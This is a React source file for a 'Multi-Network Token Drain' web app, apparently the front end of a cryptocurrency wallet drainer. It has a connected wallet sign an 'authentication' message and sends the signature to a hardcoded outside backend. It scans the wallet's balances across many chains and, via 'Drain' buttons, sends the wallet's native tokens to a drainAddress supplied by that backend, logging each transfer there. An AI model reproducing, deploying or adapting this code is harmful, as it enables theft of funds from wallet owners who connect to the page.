import { useState, useEffect } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useChainId, useWalletClient } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// Network Configuration (Matches backend)
const NETWORKS = [
  // EVM Mainnets
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', scan: true },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', scan: true },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', scan: true },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', scan: true },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', scan: true },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', scan: true },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', scan: true },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', scan: true },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', scan: true },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', scan: true },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', scan: true },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', scan: true },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', scan: true },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', scan: true },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', scan: true },
  
  // Non-EVM Chains
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', scan: false },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', scan: false },
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', scan: false },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', scan: false },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633', scan: false },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB', scan: false },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F', scan: false },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A', scan: false },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148', scan: false },
  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B', scan: false },
];

function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
          customTheme: {
            "--ck-font-family": "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
            "--ck-border-radius": "16px",
            "--ck-accent-color": "#667eea",
            "--ck-accent-text-color": "#ffffff",
            "--ck-modal-background": "#1a1a2e",
            "--ck-body-background": "#16213e",
            "--ck-body-color": "#ffffff",
            "--ck-body-color-muted": "#94a3b8",
          },
        }}
        theme="midnight"
      >
        <MultiNetworkDashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

function MultiNetworkDashboard() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();

  const [authStatus, setAuthStatus] = useState('');
  const [signature, setSignature] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [userTokens, setUserTokens] = useState({});
  const [txStatus, setTxStatus] = useState({});
  const [scanProgress, setScanProgress] = useState(0);
  const [apiStatus, setApiStatus] = useState('Checking...');

  useEffect(() => {
    if (isConnected && address) {
      handleWalletConnected(address);
    } else {
      resetState();
    }
  }, [isConnected, address]);

  useEffect(() => {
    checkApiStatus();
  }, []);

  const checkApiStatus = async () => {
    try {
      const response = await fetch(`${backendUrl}/health`);
      if (response.ok) {
        setApiStatus('🟢 Online');
      } else {
        setApiStatus('🔴 Offline');
      }
    } catch (error) {
      setApiStatus('🔴 Offline');
    }
  };

  const resetState = () => {
    setAuthStatus('');
    setSignature('');
    setUserTokens({});
    setTxStatus({});
    setScanProgress(0);
  };

  const handleWalletConnected = async (walletAddress) => {
    try {
      setAuthStatus('🔄 Wallet connected - Ready to scan ALL networks');
    } catch (error) {
      console.error("Connection error:", error);
      setAuthStatus('❌ Connection error');
    }
  };

  const authenticateAllNetworks = async () => {
    if (!address) return;
    
    try {
      setIsAuthenticating(true);
      setAuthStatus('🔐 Signing authentication for ALL networks...');
      
      const timestamp = Date.now();
      const networkNames = NETWORKS.map(n => n.name).join(', ');
      const message = `Token Drain Authentication for ALL Networks\nWallet: ${address}\nNetworks: ${networkNames}\nTime: ${timestamp}`;
      
      const sig = await signMessageAsync({ message });
      setSignature(sig);
      
      setAuthStatus('📡 Sending to backend...');
      
      const response = await fetch(`${backendUrl}/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address,
          signature: sig,
          message,
          networks: NETWORKS
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setAuthStatus('✅ Authenticated for ALL networks!');
        // Auto-scan after authentication
        setTimeout(() => scanAllNetworks(), 1000);
      } else {
        setAuthStatus(`❌ Authentication failed: ${data.error}`);
      }
      
    } catch (error) {
      console.error("Auth error:", error);
      if (error.code === 4001) {
        setAuthStatus('❌ Signature rejected');
      } else {
        setAuthStatus(`❌ Auth error: ${error.message}`);
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setAuthStatus('🌐 Scanning ALL networks...');
    setScanProgress(0);
    
    try {
      const response = await fetch(`${backendUrl}/scan/${address}`);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        // Process all network results
        const allTokens = {};
        data.data.results.forEach(result => {
          if (result.tokens.length > 0) {
            allTokens[result.network.id] = {
              network: result.network,
              tokens: result.tokens,
              totalValue: result.summary.totalValue
            };
          }
        });
        
        setUserTokens(allTokens);
        setScanProgress(100);
        
        const totalNetworks = Object.keys(allTokens).length;
        const totalTokens = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
        const totalValue = Object.values(allTokens).reduce((sum, data) => sum + data.totalValue, 0);
        
        setAuthStatus(`✅ Scanned ${totalNetworks} networks • Found ${totalTokens} tokens • $${totalValue.toFixed(2)} total`);
      } else {
        setAuthStatus(`❌ Scan failed: ${data.error}`);
      }
    } catch (error) {
      console.error("Scan error:", error);
      setAuthStatus(`❌ Scan failed: ${error.message}`);
    } finally {
      setIsScanning(false);
    }
  };

  const executeDrain = async (token) => {
    if (!walletClient || !address) {
      setTxStatus(prev => ({...prev, [token.networkId]: 'Wallet not ready'}));
      return;
    }

    try {
      setIsAuthenticating(true);
      setTxStatus(prev => ({...prev, [token.networkId]: 'Preparing transaction...'}));
      
      // For EVM native tokens
      if (token.isNative && typeof token.networkId === 'number') {
        const amountInWei = parseEther(token.amount.toString());
        
        if (amountInWei <= 0n) {
          setTxStatus(prev => ({...prev, [token.networkId]: 'Amount too small'}));
          return;
        }
        
        setTxStatus(prev => ({...prev, [token.networkId]: 'Confirm in wallet...'}));
        
        const hash = await walletClient.sendTransaction({
          to: token.drainAddress,
          value: amountInWei,
        });
        
        setTxStatus(prev => ({...prev, [token.networkId]: `✅ Sent: ${hash.substring(0, 10)}...`}));
        
        // Log to backend
        await logTransaction(token, hash);
        
        // Remove from UI
        setUserTokens(prev => {
          const updated = {...prev};
          if (updated[token.networkId]) {
            updated[token.networkId].tokens = updated[token.networkId].tokens.filter(t => 
              t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
            );
          }
          return updated;
        });
        
      } else {
        // For ERC20 or non-EVM tokens
        setTxStatus(prev => ({...prev, [token.networkId]: `Send ${token.symbol} to ${token.drainAddress}`}));
        await logTransaction(token);
      }
      
    } catch (error) {
      console.error("Drain error:", error);
      if (error.code === 4001) {
        setTxStatus(prev => ({...prev, [token.networkId]: 'User rejected'}));
      } else if (error.message.includes('insufficient funds')) {
        setTxStatus(prev => ({...prev, [token.networkId]: 'Insufficient gas'}));
      } else {
        setTxStatus(prev => ({...prev, [token.networkId]: `Error: ${error.shortMessage || error.message}`}));
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  const logTransaction = async (token, txHash = null) => {
    try {
      await fetch(`${backendUrl}/log`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fromAddress: address,
          amount: token.amount.toString(),
          chainId: token.networkId,
          tokenType: token.isNative ? 'native' : 'erc20',
          tokenAddress: token.contractAddress,
          transactionHash: txHash
        })
      });
    } catch (error) {
      console.log('Logging failed:', error.message);
    }
  };

  const formatAddress = (addr) => {
    return addr ? `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}` : '';
  };

  const getTotalValue = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.totalValue, 0).toFixed(2);
  };

  const getTotalTokens = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.tokens.length, 0);
  };

  const getNetworkCount = () => {
    return Object.keys(userTokens).length;
  };

  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-content">
            <div className="logo-section">
              <div className="logo-icon">🌍</div>
              <div>
                <h1>Multi-Network Token Drain</h1>
                <p className="tagline">Scan & Drain tokens from ALL networks</p>
              </div>
            </div>
            
            <div className="header-right">
              <div className="api-status">
                <span>Backend: {apiStatus}</span>
              </div>
              <div className="wallet-section">
                <ConnectKitButton />
              </div>
            </div>
          </div>
        </header>

        <main className="app-main">
          {isConnected && address ? (
            <div className="dashboard-grid">
              {/* Control Panel */}
              <div className="panel control-panel">
                <div className="panel-header">
                  <h2>Control Panel</h2>
                  <div className="wallet-status">
                    <span className="status-dot"></span>
                    Connected
                  </div>
                </div>
                
                <div className="wallet-info">
                  <div className="info-item">
                    <span className="label">Wallet:</span>
                    <span className="value mono">{formatAddress(address)}</span>
                  </div>
                  <div className="info-item">
                    <span className="label">Current Network:</span>
                    <span className="value">{NETWORKS.find(n => n.id === chainId)?.name || 'Unknown'}</span>
                  </div>
                  <div className="info-item">
                    <span className="label">Total Networks:</span>
                    <span className="value">{NETWORKS.length}</span>
                  </div>
                </div>

                <div className="status-container">
                  <div className={`status-message ${authStatus.includes('✅') ? 'success' : authStatus.includes('❌') ? 'error' : 'info'}`}>
                    {authStatus || 'Ready to authenticate and scan'}
                  </div>
                  
                  {signature && (
                    <div className="signature-preview">
                      <span className="mono">Signature: {signature.substring(0, 12)}...</span>
                    </div>
                  )}
                  
                  {isScanning && (
                    <div className="progress-bar">
                      <div className="progress-fill" style={{ width: `${scanProgress}%` }}></div>
                      <span className="progress-text">{scanProgress}%</span>
                    </div>
                  )}
                </div>

                <div className="action-buttons">
                  <button 
                    onClick={authenticateAllNetworks}
                    disabled={isAuthenticating || isScanning}
                    className="btn btn-primary btn-lg"
                  >
                    {isAuthenticating ? (
                      <>
                        <span className="spinner"></span>
                        Authenticating...
                      </>
                    ) : (
                      <>
                        <span className="btn-icon">🔐</span>
                        Authenticate ALL Networks
                      </>
                    )}
                  </button>
                  
                  <button 
                    onClick={scanAllNetworks}
                    disabled={isScanning || isAuthenticating}
                    className="btn btn-secondary"
                  >
                    {isScanning ? (
                      <>
                        <span className="spinner"></span>
                        Scanning...
                      </>
                    ) : (
                      <>
                        <span className="btn-icon">🔍</span>
                        Scan ALL Networks
                      </>
                    )}
                  </button>
                </div>

                {/* Quick Stats */}
                {getNetworkCount() > 0 && (
                  <div className="quick-stats">
                    <h3>Scan Results</h3>
                    <div className="stats-grid">
                      <div className="stat">
                        <span className="stat-value">{getNetworkCount()}</span>
                        <span className="stat-label">Networks</span>
                      </div>
                      <div className="stat">
                        <span className="stat-value">{getTotalTokens()}</span>
                        <span className="stat-label">Tokens</span>
                      </div>
                      <div className="stat">
                        <span className="stat-value">${getTotalValue()}</span>
                        <span className="stat-label">Total Value</span>
                      </div>
                    </div>
                  </div>
                )}
              </div>

              {/* Tokens Panel */}
              <div className="panel tokens-panel">
                <div className="panel-header">
                  <div className="header-left">
                    <h2>Detected Tokens</h2>
                    <div className="summary">
                      <span className="summary-item">{getNetworkCount()} Networks</span>
                      <span className="summary-item">{getTotalTokens()} Tokens</span>
                      <span className="summary-item">${getTotalValue()}</span>
                    </div>
                  </div>
                  
                  {getTotalTokens() > 0 && (
                    <button 
                      className="btn btn-danger"
                      onClick={() => {
                        if (window.confirm('Warning: This will attempt to drain ALL tokens. Are you sure?')) {
                          // Bulk drain implementation
                        }
                      }}
                      disabled={isAuthenticating}
                    >
                      Drain All
                    </button>
                  )}
                </div>

                {getNetworkCount() === 0 ? (
                  <div className="empty-state">
                    <div className="empty-icon">📭</div>
                    <h3>No tokens detected</h3>
                    <p>Authenticate and scan to discover tokens across all networks</p>
                    <div className="empty-actions">
                      <button 
                        onClick={authenticateAllNetworks}
                        className="btn btn-primary"
                      >
                        Authenticate First
                      </button>
                      <button 
                        onClick={scanAllNetworks}
                        className="btn btn-secondary"
                      >
                        Scan Anyway
                      </button>
                    </div>
                  </div>
                ) : (
                  <div className="tokens-container">
                    {Object.entries(userTokens).map(([networkId, data]) => (
                      <div key={networkId} className="network-section">
                        <div 
                          className="network-header"
                          style={{ borderLeftColor: data.network.color }}
                        >
                          <div className="network-info">
                            <div className="network-name">
                              <span 
                                className="network-icon"
                                style={{ backgroundColor: data.network.color }}
                              ></span>
                              {data.network.name}
                            </div>
                            <div className="network-stats">
                              <span>{data.tokens.length} tokens</span>
                              <span>${data.totalValue.toFixed(2)}</span>
                            </div>
                          </div>
                          <div className="network-status">
                            {txStatus[networkId] ? (
                              <span className="tx-status">{txStatus[networkId]}</span>
                            ) : (
                              <span className="ready">Ready</span>
                            )}
                          </div>
                        </div>

                        <div className="tokens-list">
                          {data.tokens.map((token, idx) => (
                            <div key={idx} className="token-card">
                              <div className="token-icon">
                                {token.logo ? (
                                  <img src={token.logo} alt={token.symbol} />
                                ) : (
                                  <div 
                                    className="token-placeholder"
                                    style={{ backgroundColor: data.network.color }}
                                  >
                                    {token.symbol.substring(0, 2)}
                                  </div>
                                )}
                              </div>
                              <div className="token-details">
                                <div className="token-symbol">{token.symbol}</div>
                                <div className="token-name">{token.name}</div>
                                <div className="token-amount">
                                  {parseFloat(token.amount).toLocaleString(undefined, {
                                    maximumFractionDigits: 8
                                  })}
                                </div>
                              </div>
                              <div className="token-actions">
                                <div className="token-value">
                                  {token.value ? `$${token.value.toFixed(2)}` : 'N/A'}
                                </div>
                                <button
                                  onClick={() => executeDrain(token)}
                                  disabled={token.amount <= 0 || isAuthenticating}
                                  className="drain-btn"
                                >
                                  Drain
                                </button>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          ) : (
            <div className="connection-prompt">
              <div className="prompt-content">
                <div className="prompt-icon">🔗</div>
                <h2>Connect Your Wallet</h2>
                <p>Connect to scan and manage tokens across ALL networks</p>
                <div className="connect-button-wrapper">
                  <ConnectKitButton />
                </div>
                <div className="networks-preview">
                  <p>Supported Networks:</p>
                  <div className="network-tags">
                    <span className="tag evm">EVM ({NETWORKS.filter(n => n.type === 'evm').length})</span>
                    <span className="tag non-evm">Non-EVM ({NETWORKS.filter(n => n.type === 'non-evm').length})</span>
                    <span className="tag total">Total: {NETWORKS.length}</span>
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <div className="footer-info">
              <span className="version">v5.0.0 • Multi-Network</span>
              <span className="status">Backend: {apiStatus}</span>
              <span className="mode">Production Mode</span>
            </div>
            <div className="footer-links">
              <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
                API Health
              </a>
              <a href={`${backendUrl}/networks`} target="_blank" rel="noopener noreferrer">
                Network List
              </a>
              <a href="#" onClick={(e) => {
                e.preventDefault();
                if (address) scanAllNetworks();
              }}>
                Force Rescan
              </a>
            </div>
          </div>
        </footer>
      </div>
    </div>
  );
}

export default TokenDrainApp;
